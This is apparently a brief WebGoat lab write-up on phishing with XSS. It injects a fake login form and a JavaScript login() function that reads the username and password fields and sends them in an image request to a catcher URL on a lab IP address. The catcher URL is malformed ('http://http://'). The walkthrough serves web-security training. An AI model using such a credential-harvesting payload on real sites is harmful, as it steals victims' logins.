# Phishing with XSS

Create a HTML form with 2 input fields and 1 submit button. When this button is clicked, we can see that it could our javascript code `alert('1')`

```javascript
<script>
function login() {
    alert("This is the login function!");
}
</script>
```

```html
<h1>Login required!</h1><br>
Enter username: <input type="text" id="username"><br>
Enter password: <input type="password" id="password"><br>
<input type="submit" name="login" onclick="login()">
```

The code for collecting the credentials will be replacing the code  `"alert('1')"`. The javascript will be made up of getting the user text field (id = `username`) and password field (id =  `password`).

Using javascript we can retrieve these values by simply:
(for username) `document.getElementById("username").value`
(for password) `document.getElementById("password").value`

Modifying the whole HTML code to
```html
<h1>Login required!</h1><br>
Enter username: <input type="text" id="username"><br>
Enter password: <input type="password" id="password"><br>
<input type="submit" name="login" onclick="login()">
```

```javascript
<script>
function login() {
    var temp=new Image();
    temp.src="http://http://192.168.247.135/WebGoat/catcher?PROPERTY=yes&user=" + document.getElementById("username").value+"&password="+document.getElementById("password").value;
}
</script>
```